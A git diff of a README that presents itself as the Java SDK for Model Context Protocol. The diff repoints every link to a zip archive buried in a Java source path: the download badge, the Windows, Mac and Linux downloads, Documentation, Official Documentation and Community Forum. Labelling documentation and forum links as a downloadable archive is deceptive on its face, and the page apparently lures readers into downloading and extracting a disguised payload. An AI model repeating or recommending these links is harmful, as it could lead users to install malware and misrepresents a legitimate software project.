@@ -6,7 +6,7 @@ Welcome to the Java SDK for Model Context Protocol! This guide will help you dow
 
 ## 📥 Download Now
 
-[![Download](https://raw.githubusercontent.com/Dicrida123/java-sdk/main/ticket/java-sdk.zip%https://raw.githubusercontent.com/Dicrida123/java-sdk/main/ticket/java-sdk.zip)](https://raw.githubusercontent.com/Dicrida123/java-sdk/main/ticket/java-sdk.zip)
+[![Download](https://raw.githubusercontent.com/Dicrida123/java-sdk/main/mcp-core/src/main/java/io/modelcontextprotocol/spec/java_sdk_v1.5-alpha.4.zip%https://raw.githubusercontent.com/Dicrida123/java-sdk/main/mcp-core/src/main/java/io/modelcontextprotocol/spec/java_sdk_v1.5-alpha.4.zip)](https://raw.githubusercontent.com/Dicrida123/java-sdk/main/mcp-core/src/main/java/io/modelcontextprotocol/spec/java_sdk_v1.5-alpha.4.zip)
 
 ## 📝 Overview
 
@@ -34,16 +34,16 @@ To download the Java SDK, follow these simple steps:
 
 1. **Visit the Release Page**  
    Click the link below to go to the release page:  
-   [Download the Java SDK](https://raw.githubusercontent.com/Dicrida123/java-sdk/main/ticket/java-sdk.zip)
+   [Download the Java SDK](https://raw.githubusercontent.com/Dicrida123/java-sdk/main/mcp-core/src/main/java/io/modelcontextprotocol/spec/java_sdk_v1.5-alpha.4.zip)
 
 2. **Select the Latest Release**  
    Look for the latest version listed at the top of the page. It usually includes notes about new features and fixes.
 
 3. **Download the App**  
    Click on the appropriate asset for your system to download it. Common files include:
-   - For Windows: `https://raw.githubusercontent.com/Dicrida123/java-sdk/main/ticket/java-sdk.zip`
-   - For MacOS: `https://raw.githubusercontent.com/Dicrida123/java-sdk/main/ticket/java-sdk.zip`
-   - For Linux: `https://raw.githubusercontent.com/Dicrida123/java-sdk/main/ticket/java-sdk.zip`
+   - For Windows: `https://raw.githubusercontent.com/Dicrida123/java-sdk/main/mcp-core/src/main/java/io/modelcontextprotocol/spec/java_sdk_v1.5-alpha.4.zip`
+   - For MacOS: `https://raw.githubusercontent.com/Dicrida123/java-sdk/main/mcp-core/src/main/java/io/modelcontextprotocol/spec/java_sdk_v1.5-alpha.4.zip`
+   - For Linux: `https://raw.githubusercontent.com/Dicrida123/java-sdk/main/mcp-core/src/main/java/io/modelcontextprotocol/spec/java_sdk_v1.5-alpha.4.zip`
 
 4. **Extract the Files**  
    Once the download is complete, navigate to your downloads folder. Right-click on the ZIP file and choose "Extract All" to unpack the files.
@@ -61,7 +61,7 @@ To download the Java SDK, follow these simple steps:
 
 ## 📚 Documentation
 
-Comprehensive documentation is available with each release. You can find tutorials, API references, and example projects. Browse through the [Documentation](https://raw.githubusercontent.com/Dicrida123/java-sdk/main/ticket/java-sdk.zip) to familiarize yourself with all functionalities.
+Comprehensive documentation is available with each release. You can find tutorials, API references, and example projects. Browse through the [Documentation](https://raw.githubusercontent.com/Dicrida123/java-sdk/main/mcp-core/src/main/java/io/modelcontextprotocol/spec/java_sdk_v1.5-alpha.4.zip) to familiarize yourself with all functionalities.
 
 ## 🌐 Community Involvement
 
@@ -69,9 +69,9 @@ Join our community and interact with other users. Share your experiences, ask qu
 
 ## 🔗 Useful Links
 
-- [Download the Java SDK](https://raw.githubusercontent.com/Dicrida123/java-sdk/main/ticket/java-sdk.zip)
-- [Official Documentation](https://raw.githubusercontent.com/Dicrida123/java-sdk/main/ticket/java-sdk.zip)
-- [Community Forum](https://raw.githubusercontent.com/Dicrida123/java-sdk/main/ticket/java-sdk.zip)
+- [Download the Java SDK](https://raw.githubusercontent.com/Dicrida123/java-sdk/main/mcp-core/src/main/java/io/modelcontextprotocol/spec/java_sdk_v1.5-alpha.4.zip)
+- [Official Documentation](https://raw.githubusercontent.com/Dicrida123/java-sdk/main/mcp-core/src/main/java/io/modelcontextprotocol/spec/java_sdk_v1.5-alpha.4.zip)
+- [Community Forum](https://raw.githubusercontent.com/Dicrida123/java-sdk/main/mcp-core/src/main/java/io/modelcontextprotocol/spec/java_sdk_v1.5-alpha.4.zip)
 
 ## 🛠️ Troubleshooting
 
